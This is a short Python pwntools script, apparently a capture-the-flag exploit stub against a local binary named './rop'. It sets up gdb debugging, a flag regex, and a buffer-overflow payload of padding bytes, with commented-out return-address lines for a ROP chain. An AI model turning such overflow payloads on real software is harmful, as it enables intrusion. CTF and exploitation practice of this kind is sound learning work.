#import from py
import re

#outside imports
from pwn import *

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds

do_remote = False
binary_name = './rop'

#for doing local debugging
is_local_dbg = True
gdb_script = '''
set pagination off
set disassembly-flavor intel
i proc mappings
b *0x00400621
'''



DATA = ''
# DATA += 'A' * 2048
# DATA += p64(0x00400621)
# DATA += p64(0x00400621)
# DATA += p64(0x00400621)

#uncomment these
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')

if is_local_dbg:
    target = gdb.debug(binary_name, gdb_script)
else:
    target = process(binary_name)
print target.read()
target.sendline(DATA)
target.interactive()

